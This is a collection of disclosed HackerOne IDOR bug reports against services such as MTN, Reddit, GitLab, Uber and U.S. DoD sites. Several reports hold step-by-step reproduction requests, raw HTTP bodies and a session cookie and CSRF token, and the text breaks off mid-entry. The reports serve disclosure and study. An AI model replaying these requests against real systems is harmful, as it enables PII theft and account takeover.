I discovered that there's an Insecure Direct Object Reference  on https://nin.mtnonline.com 
Vulnerable Path:  https://nin.mtnonline.com/nin/success?message=1

Steps To Reproduce:
You may not even require to submit any NIN before accessing this unprotected page,
Just visit https://nin.mtnonline.com/nin/success?message=1 

I discovered that, to  see other user's NIN, it only require 2 difference , example
https://nin.mtnonline.com/nin/success?message=3
https://nin.mtnonline.com/nin/success?message=5
https://nin.mtnonline.com/nin/success?message=7
https://nin.mtnonline.com/nin/success?message=9
https://nin.mtnonline.com/nin/success?message=11
https://nin.mtnonline.com/nin/success?message=1901
https://nin.mtnonline.com/nin/success?message=1903
https://nin.mtnonline.com/nin/success?message=8001

## Impact

This bug exposed all the submitted Nigerians National Identity Number (NIN) .which can be abused in other way else if found out by a malicious person

---

### [Business Suite "Get Leads" Resulting in Revealing User Email & Phone](https://hackerone.com/reports/1744194)

- **Report ID:** `1744194`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** TikTok
- **Reporter:** @datph4m
- **Bounty:** - usd
- **Disclosed:** 2022-11-10T23:41:50.360Z
- **CVE(s):** -

**Summary (team):**

A vulnerability within the Business Suite settings on an Android device could have resulted in a user's email and/or phone number being revealed via the "sec_user_id" parameter if their information is sent via "Get Leads". We thank @datph4m for reporting this to our team.

---

### [IDOR in API applications (able to see any API token, leads to account takeover)](https://hackerone.com/reports/1695454)

- **Report ID:** `1695454`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Automattic
- **Reporter:** @bugra
- **Bounty:** - usd
- **Disclosed:** 2022-11-01T22:46:58.148Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hi,

@ehtis, thank you for the test account. Here is a critical report. :)
On Pressable, we can create API applications at https://my.pressable.com/api/applications, and we can access many things using the API token via following the [API docs](https://my.pressable.com/documentation/api/v1)

I created an API application and tried to update it, I saw this request :

████████

As you can see there is an `application[id]` parameter that contains the application ID. I changed it to my second account's application ID and that API app moved to my account. So, there is an IDOR but it doesn't have a great impact because it just removes the API application from the victim's account.

So I tried to escalate its impact and I noticed if we remove all parameters except `application[id]` and `authenticity_token`, then send the request, the endpoint gives an error with `Name must be provided` and prints the given application ID's page. And, that page contains `Client ID` and `Client Secret`!

With this information, the attacker can make many actions on the victim's account. (https://my.pressable.com/documentation/api/v1)

## Steps To Reproduce:

  1. Go to https://my.pressable.com/api/applications and create an API app
  1. Click on the application and turn on your proxy program 
  1. Click `Update` and you will send a POST request to `/api/applications`
  1. In this request, change the `application%5Bid%5D` parameter's value to the target app ID, **then remove all parameters except `application%5Bid%5D` and `authenticity_token`**
  1. The page will give an error and you will see the victim app's page which contains `Client ID` and `Client Secret`
  1. Now, you can use these API credentials on the Pressable API.

Notes:
- API application IDs are sequential, so the attacker doesn't have to guess the IDs, s/he can access all applications
- The impact is critical because we can access many things via the API, that includes the "collaborator" endpoint https://my.pressable.com/documentation/api/v1#collaborator-bulk-create

## Impact

The attacker can access all API credentials using this vulnerability, and that leads to account takeover (via adding collaborator etc.)

Regards,
Bugra

---

### [IDOR allows an attacker to modify the links of any user](https://hackerone.com/reports/1661113)

- **Report ID:** `1661113`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Reddit
- **Reporter:** @criptex
- **Bounty:** - usd
- **Disclosed:** 2022-09-30T15:09:18.437Z
- **CVE(s):** -

**Vulnerability Information:**

Hi team!

I found an IDOR which allows to modify the links of any user.
Users can put their custom links or social media links on their profile, ex:

{F1855366}

##To reproduce this:

- Replicate the following request by replacing it with your own authentication headers:
You must also put in the body of the request, in the parameter "username" the username that you want,  you can try my username: "criptexhackerone1".
This request will return in the response the links of any user profile with the "id" of each link.


```
POST / HTTP/2
Host: gql.reddit.com
Content-Length: 62
Sec-Ch-Ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"
X-Reddit-Loid:  * * ** * * * * * * * * * * ** * *  * * * * * * * * *  * * * * *  *
Sec-Ch-Ua-Mobile: ?0
Authorization: Bearer * * * * * * *  * * * * * * * * * * * * * * * * * * * * * * * * *  * * * * *  *
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/531.36
X-Reddit-Compression: 1
X-Reddit-Session:  * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Origin: https://www.reddit.com
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.reddit.com/
Accept-Encoding: gzip, deflate
Accept-Language: es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7,bs;q=0.6,ja;q=0.5

{"id":"11a239b07f86","variables":{"username":"*********"}}
```

- When you get some "id" save it.
- In the next request you have to put in the request body, in the "id" parameter the previously saved id, you can also change the name and the link:

```
POST / HTTP/2
Host: gql.reddit.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20000101 Firefox/101.0
Accept: */*
Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 173
X-Reddit-Loid: * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
X-Reddit-Session: * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
X-Reddit-Compression: 1
Origin: https://www.reddit.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Authorization: Bearer * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
Referer: https://www.reddit.com/
Te: trailers

{"id":"c558e604581f","variables":{"input":{"socialLinks":[{"outboundUrl":"https://www.hackerone.com","title":"hacker","type":"CUSTOM","id":"* * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *"}]}}}
```
- Finally re-enter the victim's profile and you will see the modified links. It is important to mention that you may have to reload the page a few times or wait a few seconds.

## Impact

A real attacker can modify the name and content of any user's social links. It is important to add that social links are something main in user profiles, if an attacker exploits this with all reddit users it could be devastating.

Best Regards!!!

---

### [IDOR Leads To Account Takeover Without User Interaction](https://hackerone.com/reports/1272478)

- **Report ID:** `1272478`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** MTN Group
- **Reporter:** @theranger
- **Bounty:** - usd
- **Disclosed:** 2022-09-04T13:23:03.840Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hello Team,
There's IDOR Bug on this subdomain `mtnmobad.mtnbusiness.com.ng` leads to account takeover, More details check the Poc. 

## Steps To Reproduce:

  1. Create two accounts on `mtnmobad.mtnbusiness.com.ng` and both accounts verify the emails from your email inbox
  2. Login to attacker account on Browser A Go to update Profile Try to update the address for example and Capture the Request with burp send it to `Repeater`
{F1384484}
3. Login to Victim account on browser B do the same to get the victim `ID` you can Grab his ID without sending this request to `Repeater`
4. Go to the Attacker Request You sent to `Repeater` Change `/ID` with the Victim's `ID` you Grabbed From Step 3 Then change `Email` with different email, you need to change the `username` parameter not the `email` see this screenshot, Leave the email as your attacker email. the `username` Value is email and just update that one.

{F1384509} 
5.  Go Reset the Password (act like you don't know the Pass XD), login and successfully account Takeover without User Interaction

## Supporting Material/References:
--Check this Video :
{F1384553}

## Impact

Full account Takeover without user interaction

---

### [Getting access of mod logs from any public or restricted subreddit with IDOR vulnerability](https://hackerone.com/reports/1658418)

- **Report ID:** `1658418`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Reddit
- **Reporter:** @high_ping_ninja
- **Bounty:** 5000 usd
- **Disclosed:** 2022-08-04T19:38:47.697Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
There's no check if the user is moderator of the particular subreddit or not while trying to access the mod logs via gql.reddit.com by using operation id. You can change the parameter **subredditName** to any target subreddit name which is public or restricted and get access to mod logs of that subreddit.

## Steps To Reproduce:
+  Log into any account as an attacker and get the authorization token
+ Send request given below at gql.reddit.com
```
POST / HTTP/2
Host: gql.reddit.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 62
X-Reddit-Compression: 1
Origin: https://www.reddit.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Authorization: Bearer ourtoken
Referer: https://www.reddit.com/
Te: trailers

{"id":"6243efcbc61d","variables":{"subredditName":"any-subreddit"}}
```
The response will look something like below
{F1851522}
+ It only gives one page of logs.Look at the response and see if the value of **hasNextPage** is true or false. If It's false then there are no more logs other than the ones we got
+ If it's true then there are more logs and we can get them by just adding new variable **after** and assigning value of **endCursor**, which we can see in the reponse body of our request {F1851533}
+ Final request body will look something like this
```
{"id":"6243efcbc61d","variables":{"subredditName":"any-subreddit",
"after":"code-from-endCursor"
}}
```
+ After sending the request we'll get second page of logs. If we still get **hasNextPage** as true, Keep doing this untill we see **hasNextPage** set to false in the response. by doing this we can get all the pages of mod logs one by one.

> Use this script to make things easier in confirming this vulnerability (F1851561)
> The output will get stored in mod_log_out.txt in the same directory

  * [attachment / reference]

F1851522
F1851533
F1851561

## Impact

Confidential information getting exposed.

---

### [Steal private objects of other projects via project import](https://hackerone.com/reports/743953)

- **Report ID:** `743953`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** GitLab
- **Reporter:** @saltyyolk
- **Bounty:** 20000 usd
- **Disclosed:** 2022-06-07T14:16:42.999Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary
An attacker could transfer issues, merge requests of another project to the imported project by importing a crafted GitLab export. 

### Steps to reproduce
1. Import the attached tarball as GitLab export.
2. Check the issues page of the imported project. You will see an private issue created by https://gitlab.com/nyangawa-h1 instead of the current user.

### Description
The exploit is in project.json, I added one line to assign `issue_ids` and kept `issues` an empty array.
```
    "issue_ids": [ 27422144 ],                                                 
    "issues": [],  
```

The issues_ids contains the database id of the issues the attacker wants to steal. There's no good way for the attacker to know the id of a specific issue, but as the id is incremental, the attacker could simply steal as many issues as possible in a brute forcing manner.

The root cause of this issue lies in `project_tree_restorer.rb`
```
...
@project.assign_attributes(project_params)
...
```

Many attributes (foreign key) like `issue_ids` and `merge_request_ids` are not excluded during import. According to my observation, affected objects including (but not limited to):
```
board_ids
issue_ids
merge_request_ids
note_ids
...
```
Looks like almost all non-excluded attributes behaves like `issues` are affected.

### Examples

{F640860}

### Output of checks

This bug happens on GitLab.com and self-hosted GitLab installations.

## Impact

With this ability to modify relations between objects, an attacker could end up with accessing random resources of other users by traversing the incremental ID space.

---

### [Private objects exposed through project import](https://hackerone.com/reports/767770)

- **Report ID:** `767770`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** GitLab
- **Reporter:** @saltyyolk
- **Bounty:** 20000 usd
- **Disclosed:** 2022-06-07T14:16:30.343Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary
This is a bypass of https://hackerone.com/reports/743953 , the current fix is blocking all "_ids" attributes. However an attacker could still set attributes like `issue_ids` by indrectly settings the field within the `attributes` field it self:
```
# project.json
    "attributes": {
        "issue_ids": [ 29279725 ],
        "description": "Set from attributes[description]"
    },
```

### Steps to reproduce

1. Import the attached tarball.
2. Check issues tab

The other parts of the report are mostly same as those I mentioned in https://hackerone.com/reports/743953 , I decide to write a new report considering the impact to gitlab.com.

## Impact

With this ability to modify relations between objects, an attacker could end up with accessing random resources of other users by traversing the incremental ID space.

---

### [Multiple IDORs in family pairing api](https://hackerone.com/reports/1286332)

- **Report ID:** `1286332`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** TikTok
- **Reporter:** @s3c
- **Bounty:** - usd
- **Disclosed:** 2022-05-06T21:18:50.737Z
- **CVE(s):** -

**Summary (team):**

An IDOR (Insecure Direct Object Reference) vulnerability was found on a TikTok Family Pairing endpoint which could have been used to disable various features. We thank @s3c for reporting this to our team and confirming the fix.

**Summary (researcher):**

Write up 

https://s3c.medium.com/how-i-hacked-world-wide-tiktok-users-24e794d310d2

---

### [Chain of IDORs Between U4B and Vouchers APIs Allows Attackers to View and Modify Program/Voucher Policies and to Obtain Organization Employees' PII](https://hackerone.com/reports/1148697)

- **Report ID:** `1148697`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Uber
- **Reporter:** @hunt4p1zza
- **Bounty:** - usd
- **Disclosed:** 2022-04-07T20:49:44.346Z
- **CVE(s):** -

**Summary (team):**

The security researchers discovered a number of connected IDORs in the Uber business and voucher applications. By chaining these vulnerabilities together, the researchers could retrieve information related to existing voucher policies and modify those  policies for monetary gain, such as for free rides or free food. Malicious actors could also distribute modified vouchers, which potentially could cause financial damage if charged to a victim organization.

---

### [Authorization bypass -> IDOR -> PII Leakage](https://hackerone.com/reports/1489470)

- **Report ID:** `1489470`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @lubak
- **Bounty:** - usd
- **Disclosed:** 2022-04-07T20:02:38.596Z
- **CVE(s):** -

**Vulnerability Information:**

Hi team!
During testing ████ I found  javascript file containing administrative panel functionality.
It is accessible at: 
https://████/█████████
In this file I found an end point responsible for returning data about applications of the website users to the website administrators.
The returned data contains PII data (Full name, phone and email) of military personnel, and or their family members.


## References
Steps to reproduce:

Run following curl command to retrieve data:
curl https://███/███ -X POST -data="url=%2F████████" -k

Modifying ██████████ parameter result in different Application being returned.
I have tested retrieving following ids: █████.

Trying to retrieve record 60000 returns no information, so maybe ~50000 applications are accessible.

## Impact

PII leak of military personnel and family members

## System Host(s)
█████████

## Affected Product(s) and Version(s)
/█████████

## CVE Numbers


## Steps to Reproduce
Run following command to retrieve data:
curl https://███████/███ -X POST -data="url=%2F████████" -k

Modifying ██████ parameter result in different Application being returned.
I have tested retrieving following ids: ███.
Trying to retrieve record 60000 returns no information, so maybe ~50000 applications are accessible.

## Suggested Mitigation/Remediation Actions
1. admin.js should be available only after Administrator successfully logs in
2. all administrative end points must check if authorized administrator is requesting them

---

### [IDOR: leak buyer info & Publish/Hide foreign comments](https://hackerone.com/reports/1410498)

- **Report ID:** `1410498`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Judge.me 
- **Reporter:** @chupa__chups
- **Bounty:** - usd
- **Disclosed:** 2022-03-31T14:04:41.478Z
- **CVE(s):** -

**Vulnerability Information:**

HI @judgeme!
I noticed that the attacker can learn email users who left feedback at the time of buying.

Step to reproduce:

1. Login to our store and install your 'Checkout Comments' addon
2. Make fake order in or store and write a comment

███

3. Then go to our Shopify `/admin/apps/checkout-comments/extensions/checkout_comments/comments`
4. Publish our comment and Intercept request with burp. Send request to Repeater. Request example:

POST /extensions/checkout_comments/curate_comment HTTP/1.1
Host: judge.me
Cookie: _judgeme_session=████████████████; _ga=GA1.2.1935027813.1637882690; _gid=GA1.2.2043288340.1637882690; _fbp=fb.1.1637882690590.2069272048; _gat_UA-28424713-2=1
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://judge.me/extensions/checkout_comments/comments?platform=shopify&shop_domain=test-hackerone-glis.myshopify.com&page=3&offset=50
X-Csrf-Token: ████==
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 23
Origin: https://judge.me
Te: trailers
Connection: close

comment_id=1&curated=ok



5. Edit `comment_id=random_id` and in Response we can see buyer information (for example):


`{"comment":{"id":1,"content":"classic dress watch for weddings","created_at":"over 3 years ago","product":{"title":"Dress Watch","url":"https://████.myshopify.com/products/dress-watch"},"buyer":{"name":"F F","email":"██████████@gmail.com"},"published_status":true,"published_status_text":"Published","curated":"ok"}}`


██████



Video POC:



██████

## Impact

Buyer information leaks and other

---

### [GRAPHQL cross-tenant IDOR giving write access thought the operation UpdateAtlasApplicationPerson](https://hackerone.com/reports/1066203)

- **Report ID:** `1066203`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Stripe
- **Reporter:** @freesec
- **Bounty:** - usd
- **Disclosed:** 2022-03-08T20:59:08.027Z
- **CVE(s):** -

**Summary (team):**

@bubbounty discovered an Insecure Direct Object Reference (IDOR) vulnerability that allowed someone with prior Admin access to a Stripe account to add a co-founder to a Stripe Atlas application belonging to the merchant account they used to administer. The issue has been addressed by only allowing the addition of co-founders to Atlas applications by an authorized user.

Note: This bug was accepted and received before our minimum bounty amounts were increased on August 25, 2021.

---

### [IDOR delete any Tickets on ads.tiktok.com](https://hackerone.com/reports/1475520)

- **Report ID:** `1475520`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** TikTok
- **Reporter:** @datph4m
- **Bounty:** - usd
- **Disclosed:** 2022-03-02T21:15:56.182Z
- **CVE(s):** -

**Summary (team):**

An IDOR (Insecure Direct Object Reference) vulnerability was found on TikTok ads, through the "draft_order_id" parameter which could have allowed an attacker to delete the support tickets of other users. We thank @datph4m for reporting this to our team and confirming its resolution.

---

### [Able to steal private files by manipulating response using Auto Reply function of Lark](https://hackerone.com/reports/1387320)

- **Report ID:** `1387320`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Lark Technologies
- **Reporter:** @imran_nisar
- **Bounty:** - usd
- **Disclosed:** 2022-01-25T21:54:49.913Z
- **CVE(s):** -

**Summary (team):**

A IDOR (Insecure Direct Object Reference) vulnerability was found within the "AutoReply" functions of Lark. This vulnerability could have allowed malicious users to fetch the files of other users if they knew the specific file ID which was an alphanumeric value. We thank @imran_nisar for reporting this to our team and confirming its resolution.

---

### [Able to steal private files by manipulating response using Compose Email function of Lark](https://hackerone.com/reports/1373784)

- **Report ID:** `1373784`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Lark Technologies
- **Reporter:** @imran_nisar
- **Bounty:** - usd
- **Disclosed:** 2022-01-25T21:53:53.813Z
- **CVE(s):** -

**Summary (team):**

A IDOR (Insecure Direct Object Reference) vulnerability was found within the "Compose Email" functions of Lark. This vulnerability could have allowed malicious users to fetch the files of other users if they knew the specific file ID which was an alphanumeric value. We thank @imran_nisar for reporting this to our team and confirming its resolution.

---

### [Email change or personal data change on the account.](https://hackerone.com/reports/1250037)

- **Report ID:** `1250037`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Stripe
- **Reporter:** @dk82hg
- **Bounty:** 3000 usd
- **Disclosed:** 2022-01-21T14:13:31.713Z
- **CVE(s):** -

**Summary (team):**

@dk82hg found the email change flow on indiehackers.com was vulnerable to an insecure direct object reference (IDOR) which allowed an attacker to change the email associated with a user account to one they owned and ultimately take over a victim’s account in certain situations. A fix was shipped to confirm authentication on account actions.

Note: This bug was accepted and received before our minimum bounty amounts were increased on August 25, 2021.

---

### [IDOR - Other user's delivery address disclosed](https://hackerone.com/reports/964010)

- **Report ID:** `964010`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Azbuka Vkusa
- **Reporter:** @sachin_kr
- **Bounty:** - usd
- **Disclosed:** 2021-11-15T16:47:30.164Z
- **CVE(s):** -

**Summary (team):**

Closed.

---

### [Deleting all DMs on RedditGifts.com](https://hackerone.com/reports/1213237)

- **Report ID:** `1213237`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Reddit
- **Reporter:** @hakercic
- **Bounty:** 5000 usd
- **Disclosed:** 2021-10-21T19:51:19.877Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
It's possible to delete all 4.4M private messages on RedditGifts.com due to missing permission check on DELETE request

## Steps To Reproduce:

  1. Set up 3 accounts on RedditGifts.com (FriendA, FriendB, Attacker)
  1. Have FriendA send message to FriendB
  1. As Attacker send the following request (with cookies):
```
DELETE /api/v1/messages/4423007/ HTTP/1.1
Host: www.redditgifts.com
X-CSRFTOKEN: rYxQcijrs6viZxyLZt2os9gNvLgmEeXfSrH5wOe10GcOg3ABOvL3ebDbAXmeXojj
Referer: https://www.redditgifts.com/api/
Cookie: csrftoken=rYxQcijrs6viZxyLZt2os9gNvLgmEeXfSrH5wOe10GcOg3ABOvL3ebDbAXmeXojj; sessionid=osymp6sp6bb83gyt8of7qbeurtuo2450
```
Change cookies/csrf token and `4423007` to your own message ID

## Supporting Material/References:

{F1320816}
{F1320817}

## Impact

It's possible to delete all 4.4M private messages on RedditGifts.com

---

### [Chain of vulnerabilities in Uber for Business Vouchers program allows for attacker to perform arbitrary charges to victim's U4B payment account](https://hackerone.com/reports/1145428)

- **Report ID:** `1145428`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Uber
- **Reporter:** @pmnh
- **Bounty:** 5750 usd
- **Disclosed:** 2021-08-12T22:17:27.832Z
- **CVE(s):** -

**Summary (team):**

We have determined that through a chain of 3 vulnerabilities, it is possible for any U4B user to apply credit card charges or holds to any business using the Vouchers site. These charges originate from Uber and are unsolicited by the victim business, and can be made in any amount of the attacker's choosing.

---

### [IDOR while uploading ████ attachments at [█████████]](https://hackerone.com/reports/1196976)

- **Report ID:** `1196976`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @rook1337
- **Bounty:** - usd
- **Disclosed:** 2021-06-30T20:47:06.093Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
There is an IDOR vulnerability in uploading attachments to the ████ section where an attacker can upload attachments in other user's █████████ if there is no attachment uploaded by a user. If this vulnerability will be used with a Race condition, it can allow an attacker to upload attachments in all-new █████████ created by users.

## Impact

A user can upload attachments to other users ███.

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Go to ██████
2. Login
3. Go to https://███/█████
4. Add a new █████████ and upload an attachment with that and submit it.
5. Send the request to the repeater.

████
6. Change the `███Id` parameter value to the victim user's ██████████ id.

█████████
7. Click on the send button and you will see `success` in response.
8. It will be uploaded in the victim user █████ section.

## Suggested Mitigation/Remediation Actions

---

### [Ability to add arbitrary images/descriptions/titles to ohter people's issues via IDOR on getrevue.co](https://hackerone.com/reports/1096560)

- **Report ID:** `1096560`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** X / xAI
- **Reporter:** @mirhat
- **Bounty:** - usd
- **Disclosed:** 2021-05-26T21:56:54.060Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** 

Hi team,
I discovered a vulnerability that allows an attacker to add arbitrary images/descriptions/titles to other people's issues via IDOR

**Description:**

It's possible to perform a IDOR attacker on `getrevue.co`when adding a image to your issue it's also possible to add descriptions and more to other people's issue

## Steps To Reproduce:

   1. Go to `getrevue.co` and Sign In
   2. Click on Issues then Click on Add new issue
   3. Go to the Issue that you created and from the bottom of the page Click on Media
   4. Turn on the Intercept and Upload image
   5. On the request change the ID to your other account's issue ID

Request:

```
POST /app/items HTTP/1.1
Host: www.getrevue.co
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://www.getrevue.co/app/issues/current
X-CSRF-Token: qbWPNjfb12c1Plj7WrYDYgQFgWl2IaZr6/Qr/Vf5WyaDGyf68jn1mzx3xwtgFxBBX19RkHs/YHiREA7Ae6PGqg==
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 519
Origin: https://www.getrevue.co
Connection: close
Cookie: [YOUR_COOKIE]

{"item_type":"image","issue":347976,"id":null,"title":"Your account has been hacked","url":"","description":"Your account has been hacked","author":"Your account has been hacked","publication":"Your account has been hacked","section":"Your account has been hacked","image":"https://revue-direct-production.s3.amazonaws.com/cache/30fd80f79ad919f1e310aa97e0ab7940/7dc308f18b70ba627eb954d2d5376bea.png","image_file_name":"","created_at":"","tweet_handle":"","tweet_profile_image":"","tweet_description":"","tweet_lang":""}
```

POC video:

{F1185366}

## Impact

Ability to add arbitrary images/descriptions/titles to other people's issues
It's possible to hijack other people's issues

---

### [TAMS registration details API for admins open at https://tamsapi.gsa.gov/user/tams/api/usermgmnt/pendingUserDetails/](https://hackerone.com/reports/1061292)

- **Report ID:** `1061292`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** U.S. General Services Administration
- **Reporter:** @skarsom
- **Bounty:** - usd
- **Disclosed:** 2021-05-07T04:45:11.155Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
TAMS administrators are supposed to approve or deny all registration requests. The dashboard that shows these administrators details of a registration request calls the endpoint `https://tamsapi.gsa.gov/user/tams/api/usermgmnt/pendingUserDetails/(REGISTRATION_ID)`, where `(REGISTRATION_ID)` is numeric.

This endpoint will, without authentication, return the email, address, phone, attachment IDs, address, corporate info, and user roles. It will also return their request status and denial reason if applicable.

Attachments can then be viewed unauthenticated through `https://tamsapi.gsa.gov/user/tams/api/usermgmnt/getAttachmentBytes/(ATTACHMENT_ID)`.

## Steps To Reproduce:

  1. Navigate to the following URL: https://tamsapi.gsa.gov/user/tams/api/usermgmnt/pendingUserDetails/2634
  2. For attachments, navigate to the following URL: https://tamsapi.gsa.gov/user/tams/api/usermgmnt/getAttachmentBytes/600

## Recommended Mitigation:
Only allow users with valid JWT tokens for the admin role view these two endpoints.

## Impact

An unauthorized attacker can view personal information about contractors and employees gaining access to TAMS.

---

### [Cross-Tenant IDOR ( graphql `AddRulesToPixelEvents` query ) allowing to add, update, and delete rules of any Pixel events on the platform](https://hackerone.com/reports/984965)

- **Report ID:** `984965`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** TikTok
- **Reporter:** @freesec
- **Bounty:** - usd
- **Disclosed:** 2021-04-02T21:17:22.559Z
- **CVE(s):** -

**Summary (team):**

Due to an Insecure Direct Object Reference (IDOR) vulnerability, an attacker could have potentially added, deleted, or updated rules for other users' pixel events in the TikTok ads portal. We thank @bubbounty for reporting this to our team and confirming the resolution.

**Summary (researcher):**

This report is one of my firsts on the TikTok Ads portal

The Pixel events usedd by the campaigns created by the advertiser are mainly managed through GraphQl requests.

Through a single request the advertiser can Add and/or Modify and/or Delete Pixel events.
There were some IDORs weaknesses through this requests allowing to a bad advertiser to perform all these actions on any other Pixel Events of any other Adversiters.

---

### [█████████ IDOR leads to disclosure of PHI/PII](https://hackerone.com/reports/1085782)

- **Report ID:** `1085782`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @nidens
- **Bounty:** - usd
- **Disclosed:** 2021-02-18T19:17:50.327Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
████ is designed in a way where there is a vulnerable endpoint that allows a non-medical user to view the ██████████ records of people who are not ████████s of the sponsor. 

**Description:**
I am currently an Active Duty Airman and this vulnerability does require CAC authentication. When browsing the ██████ website with a proxy I noticed that there is a function that allows sponsors (in this case me) to view their █████s shot records in PDF form. After viewing my ██████████'s shot records, I noticed this functionality lives on the following endpoint `https://████=[id]`.  If you increment or decrement the `██████` parameter by 1 the application will throw an HTTP Status Code 302 and redirect you back to the `██████████` endpoint which is a good security practice. The issue with this is, that with the 302 redirect the PDF of the incremented ID will be attached in the body of the 302 requests, you are able to extract this when using a proxy like Burp Suite. Obviously, this is concerning because this would allow a user to pull any shot record without being associated with medical. 

## Step-by-step Reproduction Instructions
### I have redacted the screenshots as best as possible. The screenshots are of my information, the example for validation.

1. Navigate to ████/█████ and login with CAC
2.  Once you are authenticated browse to this endpoint, https://███████=█████████ and you should be redirected to `█████` but the 302 redirect will have the PDF information of my daughter (no actual ██████████ information is loaded).
3. On the 302 redirects, you can utilize the function `Copy to File` in burp suite to save this request as a pdf and you will have a PDF version of my ██████ shot record. 

Please review the attached screenshot, I did not pull use my █████ information for this screenshot because I have authorized to view her information. This request shows me decrementing the `██████` by 1 and showing the PDF is attached to the 302 redirects. 
██████


## Suggested Mitigation/Remediation Actions
Enforce the same permissions that are used for the `██████████` and `████` functions of the application. 

I am more than willing to speak with the developers about this if they want to e-mail my NIPR email. I took care to not go any further than just validating that the vulnerability exists and immediately stopped and started to write this report.

## Impact

PHI/PII disclosure which includes, ████████

---

### [View another user information with IDOR vulnerability ](https://hackerone.com/reports/1004745)

- **Report ID:** `1004745`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @silentbreach
- **Bounty:** - usd
- **Disclosed:** 2020-11-23T18:23:30.820Z
- **CVE(s):** -

**Vulnerability Information:**

1- Navigate to the system. (https://███████/login.php)
2- Navigate to register page. (https://██████████/register.php)(i created user, username:██████ pass: TEst.123.!)
3- Login to the system. (https://███/login.php)
4- Navigate to "My Profile Page".
5- Intercept the request.
6- Change the "UID2=4820038" cookie value with "UID2=4820036".
7- Send the request to server.
8- View another user information.

## Impact

I can view another user information.

---

### [IDOR when editing users leads to Account Takeover without User Interaction at CrowdSignal](https://hackerone.com/reports/915114)

- **Report ID:** `915114`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Automattic
